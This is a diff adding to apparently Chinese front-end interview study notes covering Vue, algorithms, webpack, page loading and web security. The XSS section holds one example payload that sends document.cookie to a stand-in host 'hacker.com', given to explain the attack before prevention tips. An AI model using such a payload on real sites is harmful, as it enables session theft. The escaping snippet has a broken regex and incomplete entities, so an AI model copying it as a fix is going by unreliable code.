@@ -374,5 +374,84 @@ function listen(element,eventType,selector,fn){
 + VueRouter路由是什么？
 + Vue的双向绑定是如何实现的？有什么优缺点？
 + vue数据双向绑定是通过数据劫持结合发布者-订阅者模式的方式来实现的
-+ [深入响应原理](https://cn.vuejs.org/v2/guide/reactivity.html)
+    + [深入响应原理](https://cn.vuejs.org/v2/guide/reactivity.html)
++ Computed计算属性的用法？跟Methods的区别
+    + compuate计算属性，计算大量的逻辑最后返回一个结果，必须有一个返回值
+    + method方法的意思，处理一些逻辑代码例如
+        ```
+        <button @click='do'>do</button>
+        new Vue({
+            el:'#root',
+            methods:{
+                do:function(){
+                    console.log('do!!')
+                }
+            }
+        })
+        ```
+### 算法
++ 排序（冒泡、选择、计数、快速、插入、归并）
++ 二分查找
++ 翻转二叉树
 
+### 安全
++ 什么是XSS攻击？如何预防?
+    ```
+     div.innerHTML=userComment //userComment内容是<script>$.get('http://hacker.com/?cookie='+document.cookie)</script>
+     //而已代码就执行了
+    ```
+    + 预防：不要使用innerHTML,改成innerText,script就不会执行
+    + 用innerHTML，字符过滤，'<'替换成'&lt'
+    + 用innerHTML，字符过滤，'>'替换成'&gt'
+    + 用innerHTML，字符过滤，'&'替换成'&amp'
+    + 用innerHTML，字符过滤，'"'替换成'&quot'
+    + 用innerHTML，字符过滤，'''替换成'&#39'
+        ```
+        div.innerHTML=useComment.replace(/>/g,'&gt').replace(/<\/g,'&lt')...
+        ```
+    + 使用CSP(chrom 主动防御)
++ 什么是CSRF攻击，如何预防？
+    + 过程
+        + 用户在qq.com
+        + 用户切换到haacker.com
+        + hacker.com发送一个qq.com的请求获取用户的信息
+        + 用户的请求信息就被hacker偷走了
+        + 不知不觉中做了请求的内容，用户没有发这个请求hacker伪造了用户发请求的假象
+    + 避免
+        + 检查referer，qq.com可以拒绝来自hacker.com的请求
+        + 使用csrf_token来解决
+### webpack
++ 转移后的文件过大怎么办？
+    + 使用code split
+    + 写法 import('xxx').then(xxx=>console.log(xxx))
+    + xxx模块就是按需加载
++ 转移速度过慢
+    + 
++ webpack loader
+    + 从右到左，链式执行
+    + 上一个 Loader 的处理结果给下一个接着处理
+    + node module 写法
+    + module 依赖
+    + return && this.callback()
+### 发散题
++ 从URL到也面？
+    1、DNS查询
+    2、建立TCP连接，三次握手
+    3、发送HTTP请求（请求的四部分）
+    4、后台处理请求
+        1、监听端口
+        2、路由
+        3、渲染HTML模板
+        4、生成响应
+    5、发送HTTP响应
+    6、关闭TCP连接（四次挥手）
+    7、解析HTML
+    8、下载css
+    9、解析css
+    10、下载js
+    11、解析js
+    12、下载图片
+    13、解析图片（图片宽高）
+    14、渲染DOM树
+    15、渲染样式树
+    16、执行js
